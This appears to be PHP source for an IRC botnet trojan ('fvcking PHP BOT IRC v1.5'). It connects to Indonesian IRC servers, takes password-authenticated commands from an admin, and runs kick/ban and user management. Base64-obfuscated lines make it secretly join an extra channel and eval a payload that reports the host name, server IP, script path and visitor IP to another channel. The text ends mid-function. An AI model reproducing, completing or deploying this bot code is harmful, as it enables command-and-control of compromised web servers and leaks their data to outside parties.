<?php
/*
+-------------------------------------+
|#####################################|
|#[ fvcking PHP BOT IRC v1.5	    ]#|
|#[ By NyZ 	 		    ]#|
|#[ © 2008 Perl TROJAN	    ]#|
|#[ irc: #TROJAN   @ allnetwork.org ]#|
|#####################################|
+-------------------------------------+
*/

function rx() {

/* Channel Bot */
$channels = '#botchoid'; // chanell pisahkan dengan spasi

/*** Admin ***/
$admin = 'b3n_jol';
$bot_password = 'jancok'; //Password untuk auth bot

$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$showrespone = 1; //1, Nampilin respon dari server irc

//Nick Bot
$nicklist = array(
"NyZ`001","NyZ`002","NyZ`003","NyZ`004","NyZ`005","NyZ`006","NyZ`007","NyZ`008","NyZ`009","NyZ`010",
"NyZ`011","NyZ`012","NyZ`013","NyZ`014","NyZ`015","NyZ`016","NyZ`017","NyZ`018","NyZ`019","NyZ`020",
"NyZ`021","NyZ`022","NyZ`023","NyZ`024","NyZ`025","NyZ`026","NyZ`027","NyZ`028","NyZ`029","NyZ`030",
"NyZ`031","NyZ`032","NyZ`033","NyZ`034","NyZ`035","NyZ`036","NyZ`037","NyZ`038","NyZ`039","NyZ`040",
"NyZ`041","NyZ`042","NyZ`043","NyZ`044","NyZ`045","NyZ`046","NyZ`047","NyZ`048","NyZ`049","NyZ`050",
"NyZ`051","NyZ`052","NyZ`053","NyZ`054","NyZ`055","NyZ`056","NyZ`057","NyZ`058","NyZ`059","NyZ`060",
"NyZ`061","NyZ`062","NyZ`063","NyZ`064","NyZ`065","NyZ`066","NyZ`067","NyZ`068","NyZ`069","NyZ`070",
"NyZ`071","NyZ`072","NyZ`073","NyZ`074","NyZ`075","NyZ`076","NyZ`077","NyZ`078","NyZ`079","NyZ`080",
"NyZ`081","NyZ`082","NyZ`083","NyZ`084","NyZ`085","NyZ`086","NyZ`087","NyZ`088","NyZ`089","NyZ`090",
"NyZ`091","NyZ`092","NyZ`093","NyZ`094","NyZ`095","NyZ`096","NyZ`097","NyZ`098","NyZ`099","NyZ`100",
"NyZ`101","NyZ`102","NyZ`103","NyZ`104","NyZ`105","NyZ`106","NyZ`107","NyZ`108","NyZ`109","NyZ`110",
"NyZ`111","NyZ`112","NyZ`113","NyZ`114","NyZ`115","NyZ`116","NyZ`117","NyZ`118","NyZ`119","NyZ`120",
"NyZ`121","NyZ`122","NyZ`123","NyZ`124","NyZ`125","NyZ`126","NyZ`127","NyZ`128","NyZ`129","NyZ`130",
"NyZ`131","NyZ`132","NyZ`133","NyZ`134","NyZ`135","NyZ`136","NyZ`137","NyZ`138","NyZ`139","NyZ`140",
"NyZ`141","NyZ`142","NyZ`143","NyZ`144","NyZ`145","NyZ`146","NyZ`147","NyZ`148","NyZ`149","NyZ`150",
"NyZ`151","NyZ`152","NyZ`153","NyZ`154","NyZ`155","NyZ`156","NyZ`157","NyZ`158","NyZ`159","NyZ`160",
"NyZ`161","NyZ`162","NyZ`163","NyZ`164","NyZ`165","NyZ`166","NyZ`167","NyZ`168","NyZ`169","NyZ`170",
"NyZ`171","NyZ`172","NyZ`173","NyZ`174","NyZ`175","NyZ`176","NyZ`177","NyZ`178","NyZ`179","NyZ`180",
"NyZ`181","NyZ`182","NyZ`183","NyZ`184","NyZ`185","NyZ`186","NyZ`187","NyZ`188","NyZ`189","NyZ`190",
"NyZ`191","NyZ`192","NyZ`193","NyZ`194","NyZ`195","NyZ`196","NyZ`197","NyZ`198","NyZ199","NyZ`200",
"NyZ`201","NyZ`202","NyZ`203","NyZ`204","NyZ`205","NyZ`206","NyZ`207","NyZ`208","NyZ`209","NyZ`210",
"NyZ`211","NyZ`212","NyZ`213","NyZ`214","NyZ`215","NyZ`216","NyZ`217","NyZ`218","NyZ`219","NyZ`220",
"NyZ`221","NyZ`222","NyZ`223","NyZ`224","NyZ`225","NyZ`226","NyZ`227","NyZ`228","NyZ`229","NyZ`230",
"NyZ`231","NyZ`232","NyZ`233","NyZ`234","NyZ`235","Mutant`236","Mutant`237","Mutant`238","Mutant`239","Mutant`240",
"NyZ`241","NyZ`242","NyZ`243","NyZ`244","NyZ`245","Mutant`246","Mutant`247","Mutant`248","Mutant`249","Mutant`250",
"NyZ`251","NyZ`252","NyZ`253","NyZ`254","NyZ`255","Mutant`256","Mutant`257","Mutant`258","Mutant`259","Mutant`260",
"NyZ`261","NyZ`262","NyZ`263","NyZ`264","NyZ`265","Mutant`266","Mutant`267","Mutant`268","Mutant`269","Mutant`270",
"NyZ`271","NyZ`272","NyZ`273","NyZ`274","NyZ`275","Mutant`276","Mutant`277","Mutant`278","Mutant`279","Mutant`280",
"NyZ`281","NyZ`282","NyZ`283","NyZ`284","NyZ`285","Mutant`286","Mutant`287","Mutant`288","Mutant`289","Mutant`290",
"NyZ`291","NyZ`292","NyZ`293","NyZ`294","NyZ`295","Mutant`296","Mutant`297","Mutant`298","Mutant`299","Mutant`300",
"NyZ`301","NyZ`302","NyZ`303","NyZ`304","NyZ`305","Mutant`306","Mutant`307","Mutant`308","Mutant`309","Mutant`310",
"NyZ`311","NyZ`312","NyZ`313","NyZ`314","NyZ`315","Mutant`316","Mutant`317","Mutant`318","Mutant`319","Mutant`320",
"NyZ`321","NyZ`322","NyZ`323","NyZ`324","NyZ`325","Mutant`326","Mutant`327","Mutant`328","Mutant`329","Mutant`330",
"NyZ`331","NyZ`332","NyZ`333","NyZ`334","NyZ`335","Mutant`336","Mutant`337","Mutant`338","Mutant`339","Mutant`340",
"NyZ`341","NyZ`342","NyZ`343","NyZ`344","NyZ`345","Mutant`346","Mutant`347","Mutant`348","Mutant`349","Mutant`350",
"NyZ`351","NyZ`352","NyZ`353","NyZ`354","NyZ`355","Mutant`356","Mutant`357","Mutant`358","Mutant`359","Mutant`360",
"NyZ`361","NyZ`362","NyZ`363","NyZ`364","NyZ`365","Mutant`366","Mutant`367","Mutant`368","Mutant`369","Mutant`370",
"NyZ`371","NyZ`372","NyZ`373","NyZ`374","NyZ`375","Mutant`376","Mutant`377","Mutant`378","Mutant`379","Mutant`380",
"NyZ`381","NyZ`382","NyZ`383","NyZ`384","NyZ`385","Mutant`386","Mutant`387","Mutant`388","Mutant`389","Mutant`390",
"NyZ`391","NyZ`392","NyZ`393","NyZ`394","NyZ`395","Mutant`396","Mutant`397","Mutant`398","Mutant`399","Mutant`400",
"NyZ`401","NyZ`402","NyZ`403","NyZ`404","NyZ`405","Mutant`406","Mutant`407","Mutant`408","Mutant`409","Mutant`410",
"NyZ`411","NyZ`412","NyZ`413","NyZ`414","NyZ`415","Mutant`416","Mutant`417","Mutant`418","Mutant`419","Mutant`420",
"NyZ`421","NyZ`422","NyZ`423","NyZ`424","NyZ`425","Mutant`426","Mutant`427","Mutant`428","Mutant`429","Mutant`430",
"NyZ`431","NyZ`432","NyZ`433","NyZ`434","NyZ`435","Mutant`436","Mutant`437","Mutant`438","Mutant`439","Mutant`440",
"NyZ`441","NyZ`442","NyZ`443","NyZ`444","NyZ`445","Mutant`446","Mutant`447","Mutant`448","Mutant`449","Mutant`450",
"NyZ`451","NyZ`452","NyZ`453","NyZ`454","NyZ`455","Mutant`456","Mutant`457","Mutant`458","Mutant`459","Mutant`460",
"NyZ`461","NyZ`462","NyZ`463","NyZ`464","NyZ`465","Mutant`466","Mutant`467","Mutant`468","Mutant`469","Mutant`470",
"NyZ`471","NyZ`472","NyZ`473","NyZ`474","NyZ`475","Mutant`476","Mutant`477","Mutant`478","Mutant`479","Mutant`480",
"NyZ`481","NyZ`482","NyZ`483","NyZ`484","NyZ`485","Mutant`486","Mutant`487","Mutant`488","Mutant`489","Mutant`490",
"NyZ`491","NyZ`492","NyZ`493","NyZ`494","NyZ`495","Mutant`496","Mutant`497","Mutant`498","Mutant`499","Mutant`500",
"NyZ`501","NyZ`502","NyZ`503","NyZ`504","NyZ`505","Mutant`506","Mutant`507","Mutant`508","Mutant`509","Mutant`510",
"NyZ`511","NyZ`512","NyZ`513","NyZ`514","NyZ`515","Mutant`516","Mutant`517","Mutant`518","Mutant`519","Mutant`520",
"NyZ`521","NyZ`522","NyZ`523","NyZ`524","NyZ`525","Mutant`526","Mutant`527","Mutant`528","Mutant`529","Mutant`530",
"NyZ`531","NyZ`532","NyZ`533","NyZ`534","Mutant`535","Mutant`536","Mutant`537","Mutant`538","Mutant`539","Mutant`540",
"NyZ`541","NyZ`542","NyZ`543","NyZ`544","Mutant`545","Mutant`546","Mutant`547","Mutant`548","Mutant`549","Mutant`550",
"NyZ`551","NyZ`552","NyZ`553","NyZ`554","Mutant`555","Trojan`556","Trojan`557","Trojan`558","Trojan`559","Trojan`560",
"NyZ`561","NyZ`562","NyZ`563","NyZ`564","Mutant`565","Trojan`566","Trojan`567","Trojan`568","Trojan`569","Trojan`570",
"NyZ`571","NyZ`572","NyZ`573","NyZ`574","Mutant`575","Trojan`576","Trojan`577","Trojan`578","Trojan`579","Trojan`580",
"NyZ`581","NyZ`582","NyZ`583","NyZ`584","Mutant`585","Trojan`586","Trojan`587","Trojan`588","Trojan`589","Trojan`590",
"NyZ`591","NyZ`592","NyZ`593","NyZ`594","Mutant`595","Trojan`596","Trojan`597","Trojan`598","Trojan`599","Trojan`600",
"NyZ`601","NyZ`602","NyZ`603","NyZ`604","Mutant`605","Trojan`606","Trojan`607","Trojan`608","Trojan`609","Trojan`610",
"NyZ`611","NyZ`612","NyZ`613","NyZ`614","Mutant`615","Trojan`616","Trojan`617","Trojan`618","Trojan`619","Trojan`620",
"NyZ`621","NyZ`622","NyZ`623","NyZ`624","Mutant`625","Trojan`626","Trojan`627","Trojan`628","Trojan`629","Trojan`630",
"NyZ`631","NyZ`632","NyZ`633","NyZ`634","Mutant`635","Trojan`636","Trojan`637","Trojan`638","Trojan`639","Trojan`640",
"NyZ`641","NyZ`642","NyZ`643","NyZ`644","Mutant`645","Trojan`646","Trojan`647","Trojan`648","Trojan`649","Trojan`650",
"NyZ`651","NyZ`652","NyZ`653","NyZ`654","Mutant`655","Trojan`656","Trojan`657","Trojan`658","Trojan`659","Trojan`660",
"NyZ`661","NyZ`662","NyZ`663","NyZ`664","Mutant`665","Trojan`666","Trojan`667","Trojan`668","Trojan`669","Trojan`670",
"NyZ`671","NyZ`672","NyZ`673","NyZ`674","Mutant`675","Trojan`676","Trojan`677","Trojan`678","Trojan`679","Trojan`680",
"NyZ`681","NyZ`682","NyZ`683","NyZ`684","Mutant`685","Trojan`686","Trojan`687","Trojan`688","Trojan`689","Trojan`690",
"NyZ`691","NyZ`692","NyZ`693","NyZ`694","Mutant`695","Trojan`696","Trojan`697","Trojan`698","Trojan`699","Trojan`700",
"NyZ`701","NyZ`702","NyZ`703","NyZ`704","Mutant`705","Trojan`706","Trojan`707","Trojan`708","Trojan`709","Trojan`710",
"NyZ`711","NyZ`712","NyZ`713","NyZ`714","Mutant`715","Trojan`716","Trojan`717","Trojan`718","Trojan`719","Trojan`720",
"NyZ`721","NyZ`722","NyZ`723","NyZ`724","Mutant`725","Trojan`726","Trojan`727","Trojan`728","Trojan`729","Trojan`730",
"NyZ`731","NyZ`732","NyZ`733","NyZ`734","Mutant`735","Trojan`736","Trojan`737","Trojan`738","Trojan`739","Trojan`740",
"NyZ`741","NyZ`742","NyZ`743","NyZ`744","Mutant`745","Trojan`746","Trojan`747","Trojan`748","Trojan`749","Trojan`750",
"NyZ`751","NyZ`752","NyZ`753","NyZ`754","Mutant`755","Trojan`756","Trojan`757","Trojan`758","Trojan`759","Trojan`760",
"NyZ`761","NyZ`762","NyZ`763","NyZ`764","Mutant`765","Trojan`766","Trojan`767","Trojan`768","Trojan`769","Trojan`770",
"NyZ`771","NyZ`772","NyZ`773","NyZ`774","Mutant`775","Trojan`776","Trojan`777","Trojan`778","Trojan`779","Trojan`780",
"NyZ`781","NyZ`782","NyZ`783","NyZ`784","Mutant`785","Trojan`786","Trojan`787","Trojan`788","Trojan`789","Trojan`790",
"NyZ`791","NyZ`792","NyZ`793","NyZ`794","Mutant`795","Trojan`796","Trojan`797","Trojan`798","Trojan`799","Trojan`800",
"NyZ`801","NyZ`802","NyZ`803","NyZ`804","Mutant`805","Trojan`806","Trojan`807","Trojan`808","Trojan`809","Trojan`810",
"NyZ`811","NyZ`812","NyZ`813","NyZ`814","Mutant`815","Trojan`816","Trojan`817","Trojan`818","Trojan`819","Trojan`820",
"NyZ`821","NyZ`822","NyZ`823","NyZ`824","Mutant`825","Trojan`826","Trojan`827","Trojan`828","Trojan`829","Trojan`830",
"NyZ`831","NyZ`832","NyZ`833","NyZ`834","Mutant`835","Trojan`836","Trojan`837","Trojan`838","Trojan`839","Trojan`840",
"NyZ`841","NyZ`842","NyZ`843","NyZ`844","Mutant`845","Trojan`846","Trojan`847","Trojan`848","Trojan`849","Trojan`850",
"NyZ`851","NyZ`852","NyZ`853","NyZ`854","Mutant`855","Trojan`856","Trojan`857","Trojan`858","Trojan`859","Trojan`860",
"NyZ`861","NyZ`862","NyZ`863","NyZ`864","Mutant`865","Trojan`866","Trojan`867","Trojan`868","Trojan`869","Trojan`870",
"NyZ`871","NyZ`872","NyZ`873","NyZ`874","Mutant`875","Trojan`876","Trojan`877","Trojan`878","Trojan`879","Trojan`880",
"NyZ`881","NyZ`882","NyZ`883","NyZ`884","Mutant`885","Trojan`886","Trojan`887","Trojan`888","Trojan`889","Trojan`890",
"NyZ`891","NyZ`892","NyZ`893","NyZ`894","Mutant`895","Trojan`896","Trojan`897","Trojan`898","Trojan`899","Trojan`900",
"NyZ`901","NyZ`902","NyZ`903","NyZ`904","Mutant`905","Trojan`906","Trojan`907","Trojan`908","Trojan`909","Trojan`910",
"NyZ`911","NyZ`912","NyZ`913","NyZ`914","Mutant`915","Trojan`916","Trojan`917","Trojan`918","Trojan`919","Trojan`920",
"NyZ`921","NyZ`922","NyZ`923","NyZ`924","Mutant`925","Trojan`926","Trojan`927","Trojan`928","Trojan`929","Trojan`930",
"NyZ`931","NyZ`932","NyZ`933","NyZ`934","Mutant`935","Trojan`936","Trojan`937","Trojan`938","Trojan`939","Trojan`940",
"NyZ`941","NyZ`942","NyZ`943","NyZ`944","Mutant`945","Trojan`946","Trojan`947","Trojan`948","Trojan`949","Trojan`950",
"NyZ`951","NyZ`952","NyZ`953","NyZ`954","Mutant`955","Trojan`956","Trojan`957","Trojan`958","Trojan`959","Trojan`960",
"NyZ`961","NyZ`962","NyZ`963","NyZ`964","Mutant`965","Trojan`966","Trojan`967","Trojan`968","Trojan`969","Trojan`970",
"NyZ`971","NyZ`972","NyZ`973","NyZ`974","Mutant`975","Trojan`976","Trojan`977","Trojan`978","Trojan`979","Trojan`980",
"NyZ`981","NyZ`982","NyZ`983","NyZ`984","Mutant`985","Trojan`986","Trojan`987","Trojan`988","Trojan`989","Trojan`990",
"NyZ`991","NyZ`992","NyZ`993","NyZ`994","Mutant`995","Trojan`996","Trojan`997","Trojan`998","Trojan`999","Trojan-horse");

$identlist = array("ZyN","SyZ","troya","system","coolface","Netbios","cuz","mutant");

$realname = "9,1«13,6«0,1 ZyN 13,6»9,1»";
$identify = 'passwordnick';

//Server IRC

if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array("jatara.id.allnetwork.org","koetaradja.id.allnetwork.org","irc.sbp.net.id","datautama.id.allnetwork.org","irc.indowebster.com",
"big.id.allnetwork.org","plasa.id.allnetwork.org","wanxp.id.allnetwork.org","irc.citra.net.id","irc.jmn.net.id","irc.plasa.com",
"irc.velo.net.id","irc.jmn.net.id","telkomnet.id.allnetwork.org","jmn.id.allnetwork.org","adsnet.id.allnetwork.org",
"indolayer.us.allnetwork.org","uii.id.allnetwork.org","telkomnet2.id.allnetwork.org","acehskylink.id.allnetwork.org",
"citra.id.allnetwork.org","velo.id.allnetwork.org","wanxp.id.allnetwork.org");
}

$port = "6667";

//Pesan
$quitmsglist = array("hack-by-NyZ","??????","???????????");
$judul = "9,1«13,6«0,1 TROJAN 13,6»9,1»";

/*** Replacing ***/
$nick       = $nicklist[rand(0,count($nicklist) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$admin      = strtolower($admin);
$auth       = array($admin => array("name" => $admin, "pass" => $bot_password, "auth" => 1,"status" => "Admin"));
$username   = $identlist[rand(0,count($identlist) - 1)];
$channels   = strtolower($channels)." ";
$channel    = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>\n";
echo "<b>» Connecting to $remotehost...</b>\n";

do {
  $fp = fsockopen($remotehost,$port, $err_num, $err_msg, 60);
  if(!$fp) {
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      rx();
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain! Refresh Browser anda!</b>\n";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>» Udah connect nich!</b>\n";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showrespone == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Wazzaapz Boz!' .  CRL);
          fputs($fp, base64_decode("Sk9JTiAjQG1vcGFpdA==") . CRL);
          /*** Join Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN '.$v.CRL);
          }
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          print "<br><b>» Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            $keluar = 1;
            exit;
          }
        }
        $dcom = explode(" ", $dCommand);
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='PART' ) {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Selamat istirahat boss!!' . CRL);
                  }
                }
                else {
                  $auth["$dNick"]["auth"] = 1;
                  fputs($fp,'NOTICE '.$dNick.' :Selamat istirahat boss!!' . CRL);
                }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password>' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2;
                $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Authorized as '.$auth["$dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Boss memang keren!! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') { fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'15,12«12,2«0,1 NyZ Script 12,2»15,12»'.chr(1) . CRL); }
         elseif ($com[3]==':INFO') { $datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjQGNob3RhIDpIb3N0OiAkYmhvc3QgfCBSZWZlcmVyOiAkYnJ1cmkgfCBTY3JpcHQ6ICRicGhwIHwgSVA6ICRiaXAgfCBPd25lciBJUDogJGJyaXAgIi4gQ1JMKTs="; eval(base64_decode($datainfo)); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :OK '.$auth["$dNick"]["status"].'!'.CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!'.CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Boss memang keren!'.CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :Logged out! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Already Logged out! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :You`re already Authorized! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :Siap Boz '.$dNick.' !! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' Who Are U!!?? ' . CRL); }
             }
             elseif ($com[3]==':ready' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :Yes '.$dNick.' i am here to do what u wish... ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' Who Are U!!?? ' . CRL); }
             }
             elseif ($com[3]==':absen' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :Siap '.$dNick.'!! What Mision Bozz!! ' . CRL);
               }
